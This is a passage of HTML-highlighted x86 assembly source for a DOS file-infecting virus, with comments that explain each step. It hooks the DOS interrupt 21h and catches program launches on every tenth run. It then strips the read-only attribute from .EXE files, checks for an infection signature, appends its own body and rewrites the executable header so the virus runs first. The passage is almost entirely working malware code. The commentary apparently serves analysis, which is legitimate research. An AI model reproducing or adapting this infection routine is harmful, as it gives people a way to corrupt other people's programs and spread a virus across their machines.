        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0084H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD21</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0086H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0086H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW21</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0084H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">EXIT</span><span class="sc0">
</span><span class="sc5">VIRUS</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This is the INT 21 replacement. It only does something in the case</span><span class="sc0">
</span><span class="sc1">;       of an EXEC call.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NEW21</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">FAR</span><span class="sc0">                        
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4BH</span><span class="sc0">                  
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L5</span><span class="sc0">
</span><span class="sc5">L4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAH</span><span class="sc0">
</span><span class="sc5">OLD21</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Only attack every tenth program run.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L5</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">COUNTER</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">L4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">COUNTER</span><span class="sc4">],</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Save all affected registers.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Search for the file name extension ...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">L6</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L8</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">L6</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       ... and quit unless it starts with "EX".</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L7</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">L4</span><span class="sc0">
</span><span class="sc5">L8</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">5845H</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">L7</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       When an .EXE file is found, the virus starts by turning off</span><span class="sc0">
</span><span class="sc1">;       the read-only attribute. The read-only attribute is not restored</span><span class="sc0">
</span><span class="sc1">;       when the file has been infected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Here, as elsewhere, the INT 21 instructions have been replaced</span><span class="sc0">
</span><span class="sc1">;       by      PUSHF/CALL DWORD PTR CS:[DOSPC]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4300H</span><span class="sc0">                </span><span class="sc1">; Get attribute</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L7</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">                </span><span class="sc1">; Set attribute</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0FEH</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L7</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Next, the file is examined to see if it is already infected.</span><span class="sc0">
</span><span class="sc1">;       The signature (4418 5F19) is stored in the last two words.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02H</span><span class="sc0">                </span><span class="sc1">; Open / write access</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L7</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; file handle in BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                      </span><span class="sc1">; now DS is no longer needed</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The header of the file is read in at [ID+8]. The virus then</span><span class="sc0">
</span><span class="sc1">;       modifies itself, according to the information stored in the</span><span class="sc0">
</span><span class="sc1">;       header. (The original CS and IP addressed are stored).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L9</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">1CH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">ORG_IP</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">1EH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">ORG_CS</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Next the read/write pointer is moved to the end of the file-4,</span><span class="sc0">
</span><span class="sc1">;       and the last 4 bytes read. They are compared to the signature,</span><span class="sc0">
</span><span class="sc1">;       and if equal nothing happens.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L9</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">    
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">L8A</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">L8A</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">L11</span><span class="sc0">
</span><span class="sc5">L9</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">L10</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">L7</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Compare to 4418,5F19</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L11</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4418H</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">L12</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5F19H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L9</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The file is not infected, so the next thing the virus does is</span><span class="sc0">
</span><span class="sc1">;       infecting it. First it is padded so the length becomes a multiple</span><span class="sc0">
</span><span class="sc1">;       of 16 bytes. This is probably done so the virus code can start at a</span><span class="sc0">
</span><span class="sc1">;       paragraph boundary.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L12</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">L13</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">L12A</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">L12A</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L9</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Next the main body of the virus is written to the end.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L13</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L9</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Next the .EXE file header is modified:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       First modify initial IP</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">LABEL1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">1CH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Modify starting CS = Virus CS. It is computed as:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       (Original length of file+padding)/16 - Start of load module</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">RCR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">RCR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">RCR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">RCR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">1EH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Modify length mod 512</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">],</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">L14</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">L14</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">511</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">0AH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Modify number of blocks used</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">511</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">L14A</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">L14A</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">0CH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Finally the modified header is written back to the start of the</span><span class="sc0">
</span><span class="sc1">;       file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">QQQ</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">ENDIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">ENDIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DOSPC</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Infection is finished - close the file and execute it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ENDIT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">L9</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
